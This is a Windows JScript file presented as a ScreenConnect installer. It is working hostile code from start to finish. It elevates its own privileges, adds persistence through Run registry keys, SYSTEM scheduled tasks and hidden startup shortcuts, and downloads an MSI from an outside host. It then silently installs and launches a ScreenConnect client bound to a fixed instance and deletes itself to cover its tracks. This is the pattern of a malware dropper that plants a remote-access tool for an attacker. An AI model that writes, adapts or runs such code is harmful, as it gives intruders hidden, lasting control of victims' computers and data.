/* ScreenConnect Installer - AutoRun with Launch After Install */
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

try {
    // Check if running with admin privileges
    var isAdmin = false;
    try {
        var isAdminCheck = shell.Run("net session", 0, true);
        isAdmin = isAdminCheck === 0;
    } catch(e) {}
    
    // If not admin, create elevated version and restart
    if (!isAdmin) {
        try {
            var scriptPath = WScript.ScriptFullName;
            var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
            var elevatedScript = tempPath + "\\elevated_" + Math.floor(Math.random() * 10000000) + ".js";
            
            // Copy current script to temporary location
            var currentScript = fso.OpenTextFile(scriptPath, 1);
            var scriptContent = currentScript.ReadAll();
            currentScript.Close();
            
            // Add marker to skip elevation on next run
            var markedScript = scriptContent.replace("var isAdmin = false;", "var isAdmin = true;");
            
            var elevatedFile = fso.CreateTextFile(elevatedScript, true);
            elevatedFile.Write(markedScript);
            elevatedFile.Close();
            
            // Create elevating batch file
            var batPath = tempPath + "\\elevate_" + Math.floor(Math.random() * 10000000) + ".bat";
            var batContent = [
                "@echo off",
                "powershell -Command \"Start-Process wscript.exe -ArgumentList '" + elevatedScript + "' -Verb RunAs\"",
                "del /f /q \"%~f0\""
            ].join("\r\n");
            
            var batFile = fso.CreateTextFile(batPath, true);
            batFile.Write(batContent);
            batFile.Close();
            
            // Run elevation batch and exit
            shell.Run(batPath, 0, false);
            WScript.Quit(0);
        } catch(e) {
            // If elevation fails, continue with current privileges
        }
    }
    
    // Add to Windows Registry for persistence
    try {
        var scriptPath = WScript.ScriptFullName;
        var registryKey = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ScreenConnectUpdater";
        
        // Try HKLM first (requires admin)
        try {
            shell.RegWrite(registryKey, "\"wscript.exe\" \"" + scriptPath + "\" //B //nologo", "REG_SZ");
        } catch(e) {
            // Fallback to HKCU if HKLM fails
            registryKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ScreenConnectUpdater";
            shell.RegWrite(registryKey, "\"wscript.exe\" \"" + scriptPath + "\" //B //nologo", "REG_SZ");
        }
        
        // Also add to Windows Task Scheduler for better persistence
        try {
            var taskName = "ScreenConnectAutoUpdate";
            var taskScript = tempPath + "\\task_" + Math.floor(Math.random() * 10000000) + ".vbs";
            
            var vbsContent = [
                'Set shell = CreateObject("WScript.Shell")',
                'command = "schtasks /create /f /tn \"' + taskName + '\" /tr \"wscript.exe \"\"" + scriptPath + "\"\" //B //nologo\" /sc onlogon /ru SYSTEM /rl HIGHEST"',
                'shell.Run command, 0, true'
            ].join("\r\n");
            
            var vbsFile = fso.CreateTextFile(taskScript, true);
            vbsFile.Write(vbsContent);
            vbsFile.Close();
            
            shell.Run("cscript.exe //nologo \"" + taskScript + "\"", 0, true);
            
            try { fso.DeleteFile(taskScript, true); } catch(e) {}
        } catch(e) {}
        
        // Add startup folder shortcut
        try {
            var startupFolder = shell.ExpandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            var shortcutName = startupFolder + "\\ScreenConnectUpdater.lnk";
            
            // Using VBScript to create shortcut
            var shortcutScript = tempPath + "\\sc_" + Math.floor(Math.random() * 10000000) + ".vbs";
            shortcutContent = [
                'Set shell = CreateObject("WScript.Shell")',
                'Set shortcut = shell.CreateShortcut("' + shortcutName + '")',
                'shortcut.TargetPath = "wscript.exe"',
                'shortcut.Arguments = "\"' + scriptPath + '\" //B //nologo"',
                'shortcut.WindowStyle = 0',
                'shortcut.Save'
            ].join("\r\n");
            
            var scFile = fso.CreateTextFile(shortcutScript, true);
            scFile.Write(shortcutContent);
            scFile.Close();
            
            shell.Run("cscript.exe //nologo \"" + shortcutScript + "\"", 0, true);
            
            try { fso.DeleteFile(shortcutScript, true); } catch(e) {}
        } catch(e) {}
    } catch(e) {}
    
    // Also add ScreenConnect service to startup directly
    try {
        var scPath = "\"C:\\Program Files (x86)\\ScreenConnect Client (c670d45fb198e457)\\ScreenConnect.ClientService.exe\"";
        
        // Add to registry for direct service startup
        shell.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ScreenConnectService", 
                     scPath, "REG_SZ");
                     
        // Add shortcut to startup folder
        var scStartupFolder = shell.ExpandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        var scShortcutName = scStartupFolder + "\\ScreenConnect.lnk";
        
        var scShortcutScript = tempPath + "\\scsc_" + Math.floor(Math.random() * 10000000) + ".vbs";
        scShortcutContent = [
            'Set shell = CreateObject("WScript.Shell")',
            'Set shortcut = shell.CreateShortcut("' + scShortcutName + '")',
            'shortcut.TargetPath = "\""C:\\Program Files (x86)\\ScreenConnect Client (c670d45fb198e457)\\ScreenConnect.ClientService.exe\""',
            'shortcut.WindowStyle = 0',
            'shortcut.Save'
        ].join("\r\n");
        
        var scShortcutFile = fso.CreateTextFile(scShortcutScript, true);
        scShortcutFile.Write(scShortcutContent);
        scShortcutFile.Close();
        
        shell.Run("cscript.exe //nologo \"" + scShortcutScript + "\"", 0, true);
        
        try { fso.DeleteFile(scShortcutScript, true); } catch(e) {}
    } catch(e) {}
    
    // Check if ScreenConnect is already installed
    var isInstalled = false;
    try {
        var checkCmd = "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s /f \"ScreenConnect\" /d";
        var proc = shell.Exec(checkCmd);
        var output = proc.StdOut.ReadAll();
        isInstalled = output.indexOf("ScreenConnect") !== -1;
    } catch(e) {};
    
    // Check if the executable exists
    var exeExists = false;
    try {
        exeExists = fso.FileExists("C:\\Program Files (x86)\\ScreenConnect Client (c670d45fb198e457)\\ScreenConnect.ClientService.exe");
    } catch(e) {}
    
    // If not installed, proceed with installation
    if (!isInstalled || !exeExists) {
        // Create log file
        var logPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\scrinstall.log";
        var logFile = fso.CreateTextFile(logPath, true);
        
        // Generate random filename
        var randomName = Math.floor(Math.random() * 10000000);
        var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
        var msiPath = tempPath + "\\" + randomName + ".msi";
        
        logFile.WriteLine("Starting elevated installation at " + new Date());
        logFile.WriteLine("Target MSI path: " + msiPath);
        logFile.WriteLine("Running with admin rights: " + isAdmin);
        
        // Download the file
        var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP.6.0");
        xmlhttp.open("GET", "https://filereader.app/tap/ScreenConnect.ClientSetup.msi", false);
        xmlhttp.send();
        
        if (xmlhttp.Status === 200) {
            // Save the file
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Open();
            stream.Type = 1; // Binary
            stream.Write(xmlhttp.ResponseBody);
            stream.SaveToFile(msiPath, 2); // Overwrite
            stream.Close();
            
            logFile.WriteLine("Download completed");
            
            // Install with all necessary parameters
            var installResult = shell.Run("msiexec.exe /i \"" + msiPath + "\" /quiet /norestart /L* \"" + tempPath + "\\" + randomName + "_install.log\"", 0, true);
            logFile.WriteLine("Installation result: " + installResult);
            
            // Wait for installation to complete
            shell.Run("ping 127.0.0.1 -n 10 > nul", 0, true);
            
            try { fso.DeleteFile(msiPath, true); } catch(e) {
                logFile.WriteLine("Failed to delete MSI: " + e.message);
            }
        } else {
            logFile.WriteLine("Download failed with status: " + xmlhttp.Status);
        }
        
        logFile.WriteLine("Script completed at " + new Date());
        logFile.Close();
    }
    
    // Check if the executable exists after installation and run it
    try {
        var servicePath = "C:\\Program Files (x86)\\ScreenConnect Client (c670d45fb198e457)\\ScreenConnect.ClientService.exe";
        
        if (fso.FileExists(servicePath)) {
            // Multiple methods to launch the service
            
            // Method 1: Direct execution
            shell.Run("\"" + servicePath + "\"", 0, false);
            
            // Method 2: Service start
            try {
                shell.Run("sc start \"ScreenConnect Client (c670d45fb198e457)\"", 0, true);
            } catch(e) {}
            
            // Method 3: Scheduled task to run at startup
            try {
                var launchTaskScript = tempPath + "\\launch_" + Math.floor(Math.random() * 10000000) + ".vbs";
                var launchTaskContent = [
                    'Set shell = CreateObject("WScript.Shell")',
                    'command = "schtasks /create /f /tn \"ScreenConnectLauncher\" /tr \"\\"\"' + servicePath + '\\"\"\" /sc onlogon /ru SYSTEM /rl HIGHEST"',
                    'shell.Run command, 0, true'
                ].join("\r\n");
                
                var launchTaskFile = fso.CreateTextFile(launchTaskScript, true);
                launchTaskFile.Write(launchTaskContent);
                launchTaskFile.Close();
                
                shell.Run("cscript.exe //nologo \"" + launchTaskScript + "\"", 0, true);
                
                try { fso.DeleteFile(launchTaskScript, true); } catch(e) {}
            } catch(e) {}
            
            // Method 4: Add to run registry key
            try {
                shell.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ScreenConnectLauncher", 
                             "\"" + servicePath + "\"", "REG_SZ");
            } catch(e) {}
        }
    } catch(e) {}
    
} catch(e) {
    // Log any error
    try {
        var errorMsg = "Error: " + e.message + " at " + new Date();
        var errorLog = shell.ExpandEnvironmentStrings("%TEMP%") + "\\screrror.log";
        var errFile = fso.CreateTextFile(errorLog, true);
        errFile.WriteLine(errorMsg);
        errFile.Close();
    } catch(e2) {}
}

// Schedule self-deletion only after all operations are complete
try {
    var scriptPath = WScript.ScriptFullName;
    var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
    var batPath = tempPath + "\\del_" + Math.floor(Math.random() * 10000000) + ".bat";
    var batFile = fso.CreateTextFile(batPath, true);
    batFile.WriteLine("@echo off");
    batFile.WriteLine("ping 127.0.0.1 -n 6 > nul");
    batFile.WriteLine("del /f /q \"" + scriptPath + "\"");
    batFile.WriteLine("del /f /q \"%0\"");
    batFile.Close();
    
    shell.Run("cmd.exe /c \"" + batPath + "\"", 0, false);
} catch(e) {}
